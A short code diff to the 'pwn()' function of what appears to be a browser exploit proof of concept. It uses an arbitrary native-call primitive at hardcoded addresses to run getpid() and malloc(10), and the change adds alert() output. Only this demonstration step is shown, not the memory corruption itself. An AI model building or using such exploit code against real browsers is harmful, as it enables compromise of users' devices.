@@ -406,7 +406,9 @@ function pwn() {
     
     let pid = arbCall(0x1babf715c); // getpid()
     log(`[+] pid = ${pid}`);
+    alert(`[+] pid = ${pid}`);
     
-    let ret = arbCall(0x1918c5280, 10); // malloc(10)
-    log(`[+] ret = 0x${ret.toString(16)}`);
+    let buf = arbCall(0x1918c5280, 10); // malloc(10)
+    log(`[+] buf = 0x${buf.toString(16)}`);
+    alert(`[+] buf = 0x${buf.toString(16)}`);
 }
